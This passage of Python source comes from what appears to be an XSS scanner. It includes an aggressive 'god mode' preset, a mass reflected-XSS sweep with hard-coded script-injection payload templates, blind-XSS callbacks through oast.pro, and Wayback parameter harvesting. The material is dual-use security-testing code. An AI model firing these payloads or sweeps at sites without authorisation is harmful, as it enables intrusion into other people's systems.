        ("firefox", "firefox.exe"),
        (r"Mozilla Firefox\firefox.exe",),
    ),
}


def _locate_browser(kind: str) -> Optional[str]:
    """Find a local browser binary: PATH name first, then common install dirs."""
    names, locations = _GOD_BROWSERS.get(kind, ((kind,), ()))
    for name in names:
        found = shutil.which(name)
        if found:
            return found
    bases: List[Path] = []
    if os.name == "nt":
        for env in ("ProgramFiles", "ProgramFiles(x86)", "LocalAppData"):
            value = os.environ.get(env)
            if value and Path(value).is_dir():
                bases.append(Path(value))
    for relative in locations:
        for base in bases:
            candidate = base / relative
            if candidate.is_file():
                return str(candidate)
    return None


def _god_browser_choice() -> Optional[Tuple[str, Optional[str]]]:
    """Best browser backend for god mode: Playwright first, then local engines."""
    with suppress(Exception):
        import playwright  # noqa: F401  # type: ignore[reportMissingImports]

        return "playwright", None
    for kind in ("chrome", "edge", "firefox", "chromium"):
        binary = _locate_browser(kind)
        if binary:
            return kind, binary
    return None


def apply_god_preset(
    args: argparse.Namespace,
    console: "Console",
    user_flags: Set[str],
) -> None:
    """``--god`` / ``--yolo`` preset: every capability on without further input.

    Budgets are raised to aggressive-but-safe maximums; explicit command-line
    flags always win so the user can still pin individual settings.
    """

    def unclaimed(*flags: str) -> bool:
        return not any(flag in user_flags for flag in flags)

    def bump(attr: str, value: Any, flag: Optional[str] = None) -> None:
        if flag and not unclaimed(flag):
            return
        current = getattr(args, attr, None)
        if current is None:
            setattr(args, attr, value)
        else:
            setattr(args, attr, max(current, value))

    recon = HAS_RECON

    # -- discovery ----------------------------------------------------------------------
    args.crawl = True
    bump("crawl_depth", 6, "--crawl-depth")
    bump("max_urls", 3000, "--max-urls")
    bump("js_files", 60, "--js-files")
    if unclaimed("--no-discover"):
        args.discover = True
    args.discover_paths = True
    args.fuzz_paths = True
    if unclaimed("--no-fuzz-params"):
        args.fuzz_params = True
    bump("fuzz_param_limit", 25, "--fuzz-param-limit")
    if recon:
        args.subdomains = True
        args.passive_urls = True
        args.openapi = True
        args.mine_params = True
        args.allow_subdomains = True
        bump("subdomain_brute", 50, "--subdomain-brute")

    # -- injection ----------------------------------------------------------------------
    bump("max_payloads", 16, "--max-payloads")
    if getattr(args, "remote_payloads", True):
        bump("payload_limit", 1500, "--payload-limit")
    args.scan_headers = True
    args.stored = True
    bump("stored_pages", 20, "--stored-pages")
    args.report_reflections = True
    args.mutation_probes = True
    args.adaptive_payloads = True
    args.char_matrix = True
    if unclaimed("--path-xss", "--no-path-xss"):
        args.path_xss = True

    # -- advanced analysis (cheap, HTTP-level) -------------------------------------------
    args.polyglot = True
    args.jsonp = True
    args.csp_analyze = True
    args.cors_analyze = True
    args.proto_pollution = True
    args.mxss = True
    args.smart_rate = True
    args.dom_clobbering = True
    args.trusted_types = True
    args.graphql = True
    args.websocket = True
    args.file_upload = True
    args.postmessage = True

    # -- network -------------------------------------------------------------------------
    bump("threads", 20, "--threads")
    bump("concurrency", 32, "--concurrency")
    bump("timeout", 30.0, "--timeout")
    bump("retries", 2, "--retries")

    # -- browser / evidence ---------------------------------------------------------------
    if args.no_browser or not unclaimed("--no-browser"):
        args.confirm = "http"
    else:
        if unclaimed("--browser"):
            choice = _god_browser_choice()
            if choice is not None:
                kind, binary = choice
                args.browser = kind
                if binary and not args.binary and unclaimed("--binary"):
                    args.binary = binary
            else:
                console.warn(
                    "God mode: no local browser found - continuing HTTP-only (equivalent to --no-browser)"
                )
                args.no_browser = True
                args.confirm = "http"
        if not args.no_browser:
            bump("browser_workers", 2, "--browser-workers")
            args.headless = True
            args.screenshot = True
            args.fragment_xss = True

    # -- blind XSS / out-of-band -----------------------------------------------------------
    configured_oob = bool(
        getattr(args, "blind", None)
        or getattr(args, "interactsh", None)
        or getattr(args, "oob_poll", None)
        or getattr(args, "oob_file", None)
    )
    if (
        not configured_oob
        and recon
        and InteractshClient is not None
        and unclaimed("--interactsh")
    ):
        try:
            import cryptography  # noqa: F401  # type: ignore[reportMissingImports]
        except Exception:
            console.warn("God mode: cryptography missing - automatic blind-XSS callbacks disabled")
        else:
            args.interactsh = "oast.pro"
            bump("oob_wait", 45.0, "--oob-wait")

    # -- external tools ---------------------------------------------------------------------
    if HAS_RECON and ExternalToolkit is not None and unclaimed("--external-tools") and not args.external_tools:
        tools: Dict[str, Any] = {}
        with suppress(Exception):
            tools = available_tools() or {}
        if any(name in tools for name in ("dalfox", "nuclei", "subfinder", "gau", "katana", "arjun", "x8")):
            args.external_tools = True




def build_parser() -> argparse.ArgumentParser:
    """Compatibility wrapper around the dedicated CLI parser module."""
    return _build_cli_parser(APP_NAME, VERSION, DEFAULT_STATE_DIR, USER_AGENT, TAMPERS.keys())


def print_payloads() -> None:
    for context in PayloadEngine.CONTEXTS:
        print(f"\n[{context}]")
        for template in DEFAULT_PAYLOADS[context]:
            print(f"  {template}")
    try:
        with open(LAZY_PAYLOAD_FILE, "r", encoding="utf-8-sig", errors="replace") as handle:
            bundled = sum(1 for line in handle if line.strip())
    except OSError:
        bundled = 0
    print(
        f"\n[Bundled LazyXss pack] {bundled} payload(s) at {LAZY_PAYLOAD_FILE} "
        "(enabled by default; disable with --no-lazy-payloads)"
    )


def print_tampers() -> None:
    print("Available tamper transforms:")
    for name in sorted(TAMPERS):
        print(f"  {name}")
    print(f"  all  (chain: {' -> '.join(TAMPER_CHAINS['all'])})")


def print_encoders() -> None:
    if not HAS_RECON or describe_encoders is None:
        print("Encoder registry unavailable (recon modules failed to import).")
        return
    print("Available encoders (use --encoder NAME, repeatable):")
    print(describe_encoders())


def run_doctor(console: Console, args: argparse.Namespace) -> int:
    """Report whether this installation can run the requested features."""
    problems = 0
    warnings = 0

    def report(status: str, name: str, detail: str) -> None:
        nonlocal problems, warnings
        if status == "fail":
            problems += 1
        elif status == "warn":
            warnings += 1
        colour = {"ok": bcolors.OKGREEN, "warn": bcolors.WARNING, "fail": bcolors.FAIL}[status]
        if _ui is not None and _ui.enabled():
            gl = _ui.glyphs()
            glyph = {"ok": gl["tick"], "warn": gl["warn"], "fail": gl["cross"]}[status]
            glyph_part = f"{colour}{glyph}{bcolors.ENDC} "
        else:
            glyph_part = ""
        label_style = f"{colour}{status:<4}{bcolors.ENDC}"
        console.raw(f"  {glyph_part}{label_style} {bcolors.GREY}{name:<20}{bcolors.ENDC} {detail}")

    console.raw("")
    console.rule("environment check")
    console.raw(f"  {bcolors.DIM}{APP_NAME} {VERSION} - verifying the installation{bcolors.ENDC}")
    console.raw("")

    if sys.version_info >= (3, 9):
        report("ok", "python", sys.version.split()[0])
    else:
        report("fail", "python", f"{sys.version.split()[0]} (>=3.9 required)")

    for module, required, extra in (
        ("aiohttp", True, "core HTTP engine"),
        ("bs4", True, "HTML parsing"),
        ("cryptography", False, "--interactsh decryption"),
        ("playwright", False, "--browser playwright"),
        ("selenium", False, "default browser backend"),
        ("uvloop", False, "faster event loop (non-Windows)"),
    ):
        try:
            __import__(module)
        except Exception:
            report("fail" if required else "warn", module, f"missing ({extra})")
        else:
            report("ok", module, extra)

    if HAS_RECON:
        tools = available_tools()
        present = [name for name, path in tools.items() if path]
    else:
        present = []
        report("warn", "recon modules", str(globals().get("_RECON_IMPORT_ERROR", "not importable")))
    report(
        "ok" if present else "warn",
        "external tools",
        ", ".join(present) if present else "none found (optional: subfinder/gau/katana/arjun/x8/dalfox/nuclei)",
    )

    state_dir = Path(args.state_dir)
    try:
        state_dir.mkdir(parents=True, exist_ok=True)
        probe = state_dir / ".doctor-write-test"
        probe.write_text("ok", encoding="utf-8")
        probe.unlink(missing_ok=True)
    except OSError as exc:
        report("fail", "state dir", f"{state_dir} not writable ({exc})")
    else:
        report("ok", "state dir", str(state_dir))

    if args.no_browser:
        report("ok", "browser", "disabled by --no-browser")
    else:
        backend = (args.browser or "firefox").lower()
        if backend == "playwright":
            try:
                import playwright  # noqa: F401  # type: ignore[reportMissingImports]
            except Exception:
                report("fail", "browser", "--browser playwright but playwright is not installed")
            else:
                report("ok", "browser", "playwright (run: playwright install chromium)")
        else:
            try:
                import selenium  # noqa: F401
            except Exception:
                report("fail", "browser", f"{backend} needs selenium: pip install selenium")
            else:
                report("ok", "browser", f"selenium/{backend}")

    # Headed-mode diagnostics: a visible browser needs a display.
    if os.name == "nt":
        report("ok", "display", "Windows session (headed mode available)")
    elif sys.platform == "darwin":
        report("ok", "display", "macOS session (headed mode available)")
    else:
        display = os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY") or ""
        if display:
            report("ok", "display", f"{display}")
        else:
            report(
                "warn",
                "display",
                "no DISPLAY/WAYLAND_DISPLAY; use --headless or `xvfb-run -a xoxss ...`",
            )

    # Chromium autodetection (used before Selenium Manager downloads a driver).
    try:
        from xoxss.core.browser import detect_chromium_binary, chromium_candidates

        detected = detect_chromium_binary()
    except Exception as exc:  # pragma: no cover - defensive
        report("warn", "chromium", f"autodetection unavailable ({exc})")
    else:
        if detected:
            report("ok", "chromium", detected)
        else:
            checked = ", ".join(chromium_candidates()[:4])
            report(
                "warn",
                "chromium",
                "no system Chromium found; Selenium Manager/Playwright will download one "
                f"(checked: {checked}, ...)",
            )

    console.raw("")
    if problems > 0:
        console.error(f"{problems} required component(s) missing, {warnings} warning(s)")
        return 1
    console.ok(f"Ready. {warnings} optional warning(s).")
    if _ui is not None and _ui.enabled():
        console.raw(f"  {_ui.rule('')}")
    return 0


def install_uvloop() -> None:
    # uvloop's DNS path can leave an unobserved getaddrinfo exception on
    # Python 3.14 when DNS is temporarily unavailable. Keep asyncio's native
    # loop there until uvloop's 3.14 resolver behavior is reliable.
    if sys.platform == "win32" or sys.version_info >= (3, 14):
        return
    try:
        import uvloop  # type: ignore

        uvloop.install()
    except Exception:
        pass


def gather_targets(args: argparse.Namespace, console: Console) -> Optional[List[str]]:
    """Read targets from arguments, ``--target-list`` or a piped stdin stream."""
    targets: List[str] = []
    if args.target_list:
        try:
            with open(args.target_list, "r", encoding="utf-8-sig", errors="replace") as handle:
                for line in handle:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as exc:
            console.error(f"Cannot read target list {args.target_list}: {exc}")
            return None
    targets.extend(args.target or [])

    if not targets and not sys.stdin.isatty():
        try:
            targets.extend(
                line.strip()
                for line in sys.stdin
                if line.strip() and not line.lstrip().startswith("#")
            )
            if targets:
                console.info(f"Read {len(targets)} target(s) from stdin", important=False)
        except OSError as exc:
            console.error(f"Cannot read targets from stdin: {exc}")
            return None

    unique_targets: List[str] = []
    seen_targets: Set[str] = set()
    for target in targets:
        cleaned = target.strip()
        key = cleaned.lower().rstrip("/")
        if cleaned and key not in seen_targets:
            seen_targets.add(key)
            unique_targets.append(cleaned)
    return unique_targets


# Stateless "mass" mode: one request per parameter, no crawl, no browser, no state.
# Payloads use the same quote-free marker as the full scanner so a hit is still
# distinguishable from a benign reflection, but the check stays substring-based.
MASS_PAYLOADS: Tuple[str, ...] = (
    "<script>{m}</script>",
    '\"><img src=x onerror={m}>',
    "'>\"><svg onload={m}>",
    "javascript:{m}//",
)

MASS_PARAMETERS: Tuple[str, ...] = (
    "q",
    "s",
    "search",
    "query",
    "id",
    "pagina",
    "page",
    "lang",
    "callback",
    "url",
    "redirect",
    "next",
)




async def run_mass(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    """Fast reflected-XSS sweep for very large URL lists.

    Deliberately narrow: existing query parameters are rewritten one at a time,
    URLs without a query get a short list of common parameter names, and only
    HTTP evidence is collected.  This is the path for tens of thousands of URLs;
    the full scanner remains the path for browser-confirmed findings.
    """
    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0
    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    stats = ScanStats(urls_total=len(targets))
    engine = PayloadEngine(
        console,
        args.payload_file,
        corpus_dirs=getattr(args, "payload_dir", None),
        lazy_payloads=getattr(args, "lazy_payloads", True),
    )
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies, getattr(args, "cookie_file", None)),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
        http2=getattr(args, "http2", False),
        impersonate=getattr(args, "impersonate", None),
    )
    custom_params = [
        item.strip()
        for item in str(getattr(args, "mass_params", "") or "").split(",")
        if item.strip()
    ]
    fallback_params = custom_params or list(MASS_PARAMETERS)
    payload_budget = max(1, int(getattr(args, "mass_payloads", 4) or 4))
    templates = list(MASS_PAYLOADS)[:payload_budget]
    if len(templates) < payload_budget:
        templates.extend(engine.payloads_for("generic", limit=payload_budget - len(templates)))
    templates = list(dict.fromkeys(templates))

    jsonl_path = getattr(args, "jsonl", None)
    jsonl_handle = None
    if jsonl_path:
        try:
            Path(jsonl_path).parent.mkdir(parents=True, exist_ok=True)
            jsonl_handle = open(jsonl_path, "a", encoding="utf-8")
        except OSError as exc:
            console.error(f"Cannot write JSONL output {jsonl_path}: {exc}")
            return 1, 0

    actionable = 0
    lock = asyncio.Lock()

    def emit(finding: Finding) -> None:
        nonlocal actionable
        stats.findings += 1
        if finding.confidence in ("confirmed", "high"):
            actionable += 1
        if jsonl_handle is not None:
            jsonl_handle.write(json.dumps(finding.to_dict(), ensure_ascii=False) + "\n")
            jsonl_handle.flush()

    async def sweep(url: str) -> None:
        if not re.match(r"^https?://", url, re.IGNORECASE):
            url = "http://" + url
        parts = urlsplit(url)
        params = [name for name, _value in parse_qsl(parts.query, keep_blank_values=True)]
        if not params:
            params = fallback_params[:6]
        for param in dict.fromkeys(params):
            for template in templates:
                token = unique_token("m", 8)
                payload = engine.render(template, token, "html")
                payload = apply_tamper(payload, getattr(args, "tamper", None))
                chain = getattr(args, "encoder", None) or []
                if chain and HAS_RECON and apply_encoder_chain is not None:
                    payload = apply_encoder_chain(payload, chain)
                probe_url = replace_query_param(url, param, payload)
                response = await http.get(probe_url, cache=False)
                if response.error or not response.text:
                    continue
                info = analyze_reflection(
                    response.text, token, payload, response.header("content-type", "")
                )
                if not info.reflected or not info.executable:
                    continue
                finding = Finding(
                    kind="Reflected XSS (HTTP evidence)",
                    url=probe_url,
                    parameter=param,
                    method="GET",
                    payload=payload,
                    evidence=f"marker reflected unescaped ({info.detail})",
                    confidence="high",
                    confidence_rationale=(
                        "Delimiters survived verbatim in an executable context; mass mode "
                        "does not attempt browser confirmation."
                    ),
                    context=info.context,
                    detail="mass mode: browser confirmation not attempted",
                    tags=["mass"],
                    subkey=param,
                    source="query",
                    poc_url=probe_url,
                    request=response.request_dict(param),
                    response_status=response.status or 0,
                    response_excerpt=response_excerpt(response.text, token),
                )
                async with lock:
                    console.finding(finding)
                    emit(finding)
                break

    try:
        await http.start()
        semaphore = asyncio.Semaphore(max(1, args.concurrency))

        async def worker(target: str) -> None:
            async with semaphore:
                try:
                    await sweep(target)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    console.debug(f"mass: {target}: {exc}")
                finally:
                    stats.urls_done += 1
                    if stats.urls_done % 500 == 0:
                        console.info(
                            f"mass: {stats.urls_done}/{len(targets)} URLs, "
                            f"{stats.findings} finding(s)",
                            important=False,
                        )

        await asyncio.gather(*(worker(target) for target in targets))
        console.info(
            f"mass complete: {stats.urls_done} URL(s), {stats.requests} request(s), "
            f"{actionable} actionable finding(s)",
            important=True,
        )
    finally:
        await http.close()
        if jsonl_handle is not None:
            jsonl_handle.close()
    return 0, actionable


async def run_param_audit(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    """Collect candidate parameters (collector style) and probe reflection (Gxss style).

    This mode is intentionally independent from the full scanner: it performs no
    crawling, browser work, payload download or checkpointing.  It harvests URLs
    from Wayback (or an input file), extracts parameter names, then substitutes a
    unique marker into exactly one parameter per request and checks the response.
    """
    if not HAS_PARAM_AUDIT:
        console.error(
            "Parameter-audit modules failed to import: "
            + str(globals().get("_PARAM_IMPORT_ERROR", "unknown error"))
        )
        return 1, 0
    assert ParameterHarvester is not None and ReflectionProbe is not None

    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0
    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    stats = ScanStats(urls_total=len(targets))
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies, getattr(args, "cookie_file", None)),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
        http2=getattr(args, "http2", False),
        impersonate=getattr(args, "impersonate", None),
    )
    harvester = ParameterHarvester(
        http, console, limit=max(1, args.param_limit), timeout=max(10.0, args.timeout * 2)
    )
    probe = ReflectionProbe(
        http,
        console,
        marker=args.param_marker,
        concurrency=max(1, args.concurrency),
        batch_size=min(100, max(1, int(getattr(args, "param_batch_size", 100)))),
    )

    seed_urls: List[str] = []
    source_errors: List[str] = []
    source = args.param_source or (
        "none" if (args.param_input or args.param_data) else "wayback"
    )
    if source in ("passive", "both") and not HAS_RECON:
        console.warn("Passive URL collection is unavailable; scanning the supplied targets only")
        source = "wayback" if source == "both" else "none"
    try:
        if args.param_input:
            try:
                with open(args.param_input, "r", encoding="utf-8-sig", errors="replace") as handle:
                    for line in handle:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            seed_urls.append(line)
            except OSError as exc:
                console.error(f"Cannot read --param-input {args.param_input}: {exc}")
                return 1, 0

        for target in targets:
            candidate_target = target if target.lower().startswith(("http://", "https://")) else "http://" + target
            seed_urls.append(candidate_target)

        if source in ("wayback", "both"):
            wayback_attempted = 0
            wayback_found = 0
            for target in targets:
                host = (urlsplit(target if "://" in target else "http://" + target).hostname or "").lower()
                if not host:
                    continue
                domain = host
                if HAS_RECON and root_domain is not None:
                    try:
                        domain = root_domain(host) or host
                    except Exception:
                        domain = host
                wayback_attempted += 1
                found = await harvester.wayback(domain, include_subdomains=bool(args.param_subs))
                wayback_found += len(found)
                seed_urls.extend(found)
            if wayback_attempted and not wayback_found:
                console.warn(
                    "Wayback returned no URLs for the target, or the CDX API is unavailable; "
                    "use --param-input with a URL list to audit offline."
                )

        if source in ("passive", "both") and HAS_RECON and PassiveURLCollector is not None:
            for target in targets:
                host = (urlsplit(target if "://" in target else "http://" + target).hostname or "").lower()
                if not host:
                    continue
                domain = host
                if root_domain is not None:
                    try:
                        domain = root_domain(host) or host
                    except Exception:
                        domain = host
                try:
                    collected = await PassiveURLCollector(
                        http,
                        console,
                        timeout=max(10.0, args.timeout * 2),
                        limit=max(1, args.param_limit),
                    ).collect(domain)
                    seed_urls.extend(collected.urls)
                    source_errors.extend(collected.errors)
                except Exception as exc:
                    source_errors.append(f"{domain}: {exc}"[:300])
    finally:
        await http.close()

    if args.param_data:
        # Accept either URL-encoded form data or a JSON object on the first seed.
        if not seed_urls:
            console.error("--param-data requires at least one target URL")
            return 1, 0
        try:
            json_data = json.loads(args.param_data)
        except Exception:
            json_data = None
        if isinstance(json_data, dict):
            paths = ReflectionProbe._json_leaf_paths(json_data)
            report = harvester.from_names(seed_urls[0], paths, source="json-post")
        else:
            try:
                pairs = parse_qsl(args.param_data, keep_blank_values=True)
            except Exception:
                pairs = []
            if not pairs:
                console.error(
                    "--param-data must be a form body such as 'user=test&pass=test' "
                    "or a JSON object such as '{\"user\":\"test\"}'"
                )
                return 1, 0
            report = harvester.from_pairs(seed_urls[0], pairs, source="post")
    else:
        report = harvester.harvest(seed_urls, domain="", source="audit")
    report.errors.extend(source_errors)

    if not report.candidates:
        console.warn(
            "No query parameters found. Supply URLs with parameters via --param-input, "
            "use --param-source passive, or pass a target URL with a query string."
        )
        return 0, 0

    max_checks = max(1, int(args.param_max_checks or 10000))
    candidates = report.candidates[:max_checks]
    # The HTTP engine was closed after harvesting; reopen it for the probe pass
    # so the session lifetime stays explicit and testable.
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies, getattr(args, "cookie_file", None)),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
        http2=getattr(args, "http2", False),
        impersonate=getattr(args, "impersonate", None),
    )
    probe.http = http
    try:
        candidates = await probe.probe_candidates(candidates, data=args.param_data or "")
    finally:
        await http.close()

    stats.passive_urls = len(report.urls)
    stats.discovered_params = len(report.candidates)
    reflected = [candidate for candidate in candidates if candidate.reflected]
    candidates.sort(key=lambda item: (not item.reflected, -item.count, item.name))

    console.info(
        f"Parameter audit: {len(report.urls)} URL(s), {len(candidates)} parameter(s), "
        f"{len(reflected)} reflecting",
        important=True,
    )
    for candidate in candidates:
        if args.quiet and not candidate.reflected:
            continue
        if candidate.reflected:
            console.ok(
                f"reflected: {candidate.name} "
                f"(risk={candidate.risk}, hits={candidate.count}, context={candidate.context or 'unknown'})",
                important=True,
            )
        else:
            console.raw(
                f"  candidate: {candidate.name} (risk={candidate.risk}, hits={candidate.count})"
            )
        if candidate.reflected and candidate.probe_url:
            console.raw(f"      {candidate.probe_url}")
        if args.verbose and candidate.evidence:
            console.raw(f"      {candidate.evidence}")

    audit_payload: Dict[str, Any] = {
        "tool": APP_NAME,
        "version": VERSION,
        "mode": "param-audit",
        "finished": datetime.now(timezone.utc).isoformat(),
        "targets": targets,
        "source": source,
        "stats": asdict(stats),
        "candidates": [candidate.to_dict() for candidate in candidates],
        "errors": report.errors,
    }
    if args.param_output:
        output_path = Path(args.param_output)
        try:
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_text(
                json.dumps(audit_payload, indent=2, ensure_ascii=False) + "\n",
                encoding="utf-8",
            )
            console.info(f"Parameter audit JSON written to {output_path}", important=False)
        except OSError as exc:
            console.warn(f"Cannot write parameter audit report {output_path}: {exc}")

    if args.jsonl:
        try:
            jsonl_path = Path(args.jsonl)
            jsonl_path.parent.mkdir(parents=True, exist_ok=True)
            with open(jsonl_path, "a", encoding="utf-8") as handle:
                for candidate in candidates:
                    handle.write(json.dumps(candidate.to_dict(), ensure_ascii=False) + "\n")
            console.info(f"Parameter audit JSONL written to {jsonl_path}", important=False)
        except OSError as exc:
            console.warn(f"Cannot write parameter audit JSONL {args.jsonl}: {exc}")

    return 0, len(reflected)


async def run_targets(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    actionable = 0
    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0

    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    for index, target in enumerate(targets, 1):
        if len(targets) > 1:
            console.raw("")
            console.info(f"[{index}/{len(targets)}] {target}")
        scanner = XSSScanner(target, args, console)
        console.event("target_started", target=scanner.target, index=index, total=len(targets))
        try:
            findings = await scanner.run()
            # Blind injections are recorded immediately but only become real
            # findings after an out-of-band callback.  Don't let them fail CI.
            actionable += sum(1 for finding in findings if finding.confidence in ("confirmed", "high"))
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            console.event("target_failed", target=scanner.target, error=f"{type(exc).__name__}: {exc}")
            console.error(f"Scan failed for {target}: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
        finally:
            if scanner.pool is not None:
                await scanner.pool.stop()
                scanner.pool = None
            await scanner.http.close()

    return 0, actionable


# --------------------------------------------------------------------------------------
# Replay: re-run one finding from a prior JSON report
# --------------------------------------------------------------------------------------

_REPLAY_TOKEN_RE = re.compile(r"[a-z][a-z0-9]{8,}")
_REPLAY_COMMENT_TOKEN_RE = re.compile(r"/\*\s*([a-z][a-z0-9]{6,})\s*\*/")
_REPLAY_CHARCODE_RE = re.compile(r"String\.fromCharCode\(\s*([0-9][0-9,\s]*)\)")


def resolve_headless(args: argparse.Namespace, explicit_flags: Set[str]) -> None:
    """Pick headless vs headed unless the operator was explicit.

    Headed is the friendly default on an interactive terminal; CI and
    non-interactive runs (pipes, cron, containers) stay headless so they never
    block on a display that does not exist.
    """
    if getattr(args, "no_browser", False):
        args.headless = True
        return
    if "--headless" in explicit_flags:
        args.headless = True
        if "--show-browser" in explicit_flags:
            args.show_browser = False
        return
    if "--show-browser" in explicit_flags or getattr(args, "show_browser", False):
        args.headless = False
        return
    # A preset (god mode) may have pinned headless internally; keep it unless
    # the operator asked for a visible window.
    if getattr(args, "headless", False):
        args.headless = True
        return
    ci = any(
        os.environ.get(name)
        for name in (
            "CI",
            "GITHUB_ACTIONS",
            "GITLAB_CI",
            "JENKINS_URL",
            "BUILDKITE",
            "TF_BUILD",
            "CIRCLECI",
            "TRAVIS",
            "TEAMCITY_VERSION",
        )
    )
    has_display = (
        os.name == "nt"
        or sys.platform == "darwin"
        or bool(os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"))
    )
    args.headless = not (sys.stdout.isatty() and not ci and has_display)


def _replay_report_path(args: argparse.Namespace) -> Optional[Path]:
    explicit = getattr(args, "replay_report", None)
    if explicit:
        return Path(explicit)
    report_dir = Path(getattr(args, "report_dir", os.path.join(DEFAULT_STATE_DIR, "reports")))
    if not report_dir.is_dir():
        return None

    def _mtime(path: Path) -> float:
        try:
            return path.stat().st_mtime
        except OSError:
            return 0.0

    candidates = sorted(report_dir.glob("*.json"), key=_mtime, reverse=True)
    return candidates[0] if candidates else None


def load_replay_finding(
    args: argparse.Namespace,
) -> Tuple[Optional[Dict[str, Any]], Optional[Path], str]:
    """Return ``(finding, report_path, error)`` for ``--replay``."""
    path = _replay_report_path(args)
    if path is None:
        return None, None, (
            "no JSON report found; pass --replay-report PATH or write a report with --report json"
        )
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except OSError as exc:
        return None, path, f"cannot read {path}: {exc}"
    except json.JSONDecodeError as exc:
        return None, path, f"{path} is not valid JSON: {exc}"
    findings = data.get("findings")
    if not isinstance(findings, list) or not findings:
        return None, path, f"{path} contains no findings"
    wanted = str(getattr(args, "replay", "") or "").strip().lower()
    if not wanted:
        return None, path, "--replay requires a finding id (see the report's finding_id column)"
    fields = set(Finding.__dataclass_fields__)
    for item in findings:
        if not isinstance(item, dict):
            continue
        identity = str(item.get("finding_id") or "").strip().lower()
        if not identity:
            # Reports written before finding IDs were introduced still carry
            # every field needed to derive the same stable identity.
            try:
                derived = Finding(
                    **{key: value for key, value in item.items() if key in fields}
                )
            except Exception:
                identity = ""
            else:
                identity = derived.finding_id.lower()
        if identity and (identity == wanted or identity.startswith(wanted)):
            return item, path, ""
    return None, path, f"no finding matches '{wanted}' in {path.name}"


def _replay_request_args(
    item: Dict[str, Any],
) -> Tuple[str, str, Dict[str, str], str]:
    """Recover ``(method, url, headers, body)`` from a report finding."""
    request = item.get("request") if isinstance(item.get("request"), dict) else {}
    url = str(request.get("url") or "")
    method = str(request.get("method") or item.get("method") or "GET").upper()
    headers = {
        str(name): str(value)
        for name, value in (request.get("headers") or {}).items()
    }
    body = str(request.get("body") or "")
    if not url:
        parsed = parse_curl_request(
            str(item.get("poc_curl") or item.get("poc_command") or "")
        )
        if parsed:
            url = str(parsed.get("url") or "")
            method = str(parsed.get("method") or method).upper()
            headers = dict(parsed.get("headers") or {})
            body = str(parsed.get("body") or "")
    if not url:
        url = str(item.get("poc_url") or item.get("url") or "")
    # Redacted values are placeholders, not credentials: drop them so the
    # request is not replayed with the literal string "[REDACTED]".
    headers = {
        name: value
        for name, value in headers.items()
        if value and value != "[REDACTED]"
    }
    return method, url, headers, body


def _replay_token(payload: str) -> str:
    """Pick the strongest marker embedded in a payload for browser matching.

    ``js_marker`` writes the marker both as a ``/*token*/`` comment and as a
    ``String.fromCharCode`` call.  Preferring those forms avoids mistaking an
    ordinary long word (``javascript``) for the run's unique marker.
    """
    text = payload or ""
    charcode = _REPLAY_CHARCODE_RE.search(text)
    if charcode:
        try:
            decoded = "".join(
                chr(int(part))
                for part in charcode.group(1).replace(" ", "").split(",")
                if part
            )
        except (TypeError, ValueError):
            decoded = ""
        # ``js_marker`` pushes a unique token; requiring a digit and some
        # length avoids mistaking a payload gadget (``String.fromCharCode``
        # for "alert") for the marker.
        if (
            len(decoded) >= 8
            and re.fullmatch(r"[a-z][a-z0-9]+", decoded)
            and any(char.isdigit() for char in decoded)
        ):
            return decoded
    comment = _REPLAY_COMMENT_TOKEN_RE.search(text)
    if comment:
        return comment.group(1)
    candidates = _REPLAY_TOKEN_RE.findall(text)
    if candidates:
        return max(candidates, key=len)
    return text


def _make_replay_browser(args: argparse.Namespace, console: Console) -> Any:
    use_playwright = (getattr(args, "browser", "") or "").lower() == "playwright" or bool(
        getattr(args, "auth_state", None)
    )
    engine_class = PlaywrightEngine if use_playwright else BrowserEngine
    return engine_class(
        console,
        kind="playwright" if use_playwright else getattr(args, "browser", "firefox"),
        headless=getattr(args, "headless", True),
        page_timeout=max(10.0, getattr(args, "timeout", 20.0)),
        user_agent=getattr(args, "user_agent", None),
        proxy=getattr(args, "proxy", None),
        binary=getattr(args, "binary", None),
        insecure=getattr(args, "insecure", False),
        auth_state=getattr(args, "auth_state", None),
    )


async def run_replay(args: argparse.Namespace, console: Console) -> int:
    """Re-run exactly one reported finding: one request + one browser check."""
